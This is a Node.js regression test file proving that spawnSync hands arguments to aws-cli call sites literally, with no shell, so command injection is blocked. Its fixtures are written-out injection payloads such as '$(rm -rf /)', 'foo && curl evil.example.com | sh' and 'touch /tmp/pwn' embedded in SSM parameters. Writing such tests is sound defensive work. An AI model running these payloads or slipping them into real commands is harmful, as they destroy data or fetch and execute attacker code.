// Issue #763 regression: prove that spawnSync passes argv elements
// literally to the spawned process without involving a shell. If this
// guarantee ever weakens (e.g. by a Node patch that flips `shell: true`
// by default), every aws-cli call site in mcp/ops would silently
// regain a command-injection path. These tests fail loudly in that
// case.
//
// We use a tiny argv-echo script that prints process.argv.slice(2)
// (everything after node binary + script path) as JSON so the test
// can compare round-tripped argv byte-for-byte. We use a script file
// rather than `node -e` because argv elements that look like node
// options (e.g. `--filter-pattern`) are otherwise consumed by node's
// own option parser before reaching the script.

import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { writeFileSync, mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

let scriptPath;
let workDir;

before(() => {
  workDir = mkdtempSync(path.join(tmpdir(), "argv-roundtrip-"));
  scriptPath = path.join(workDir, "argv-echo.mjs");
  writeFileSync(
    scriptPath,
    "process.stdout.write(JSON.stringify(process.argv.slice(2)));\n"
  );
});

after(() => {
  if (workDir) rmSync(workDir, { recursive: true, force: true });
});

function roundtrip(payload) {
  const result = spawnSync(
    process.execPath,
    [scriptPath, ...payload],
    { encoding: "utf-8", timeout: 10000 }
  );
  if (result.error) throw result.error;
  if (result.status !== 0) {
    throw new Error(
      `argv echo helper failed: status=${result.status} stderr=${result.stderr}`
    );
  }
  return JSON.parse(result.stdout);
}

describe("spawnSync argv round-trip (issue #763)", () => {
  it("preserves $() command substitution literally", () => {
    const payload = ["--filter-pattern", "$(rm -rf /)"];
    assert.deepEqual(roundtrip(payload), payload);
  });

  it("preserves backtick command substitution literally", () => {
    const payload = ["--filter-pattern", "`id`"];
    assert.deepEqual(roundtrip(payload), payload);
  });

  it("preserves single quotes literally", () => {
    const payload = [
      "--parameters",
      "'; rm -rf /; echo '",
    ];
    assert.deepEqual(roundtrip(payload), payload);
  });

  it("preserves double quotes literally", () => {
    const payload = ["--filter-pattern", '"; whoami; echo "'];
    assert.deepEqual(roundtrip(payload), payload);
  });

  it("preserves semicolons literally", () => {
    const payload = ["--filter-pattern", "foo; rm -rf /"];
    assert.deepEqual(roundtrip(payload), payload);
  });

  it("preserves ampersands and pipes literally", () => {
    const payload = ["--filter-pattern", "foo && curl evil.example.com | sh"];
    assert.deepEqual(roundtrip(payload), payload);
  });

  it("preserves spaces inside a single argv element", () => {
    const payload = ["--key", "this is one element"];
    assert.deepEqual(roundtrip(payload), payload);
  });

  it("preserves newlines inside an argv element", () => {
    const payload = ["--filter-pattern", "line one\nline two"];
    assert.deepEqual(roundtrip(payload), payload);
  });

  it("preserves the SSM --parameters JSON shape with embedded shell metacharacters", () => {
    const params = JSON.stringify({
      commands: ["echo $(whoami) && touch /tmp/pwn"],
    });
    const payload = [
      "ssm",
      "send-command",
      "--instance-ids",
      "i-0123456789abcdef0",
      "--document-name",
      "AWS-RunShellScript",
      "--parameters",
      params,
    ];
    const result = roundtrip(payload);
    assert.deepEqual(result, payload);
    assert.ok(
      result[result.length - 1].includes("$(whoami)"),
      "JSON-embedded $() must round-trip literally"
    );
  });

  it("preserves S3 keys containing shell metacharacters", () => {
    const payload = [
      "s3api",
      "head-object",
      "--bucket",
      "evil$(id)bucket",
      "--key",
      "path/to/`whoami`/file.txt",
    ];
    assert.deepEqual(roundtrip(payload), payload);
  });

  it("preserves CloudWatch filter patterns containing all metacharacters at once", () => {
    const payload = [
      "logs",
      "filter-log-events",
      "--filter-pattern",
      "$()`'\";|&\nsh -c 'whoami'",
    ];
    assert.deepEqual(roundtrip(payload), payload);
  });
});
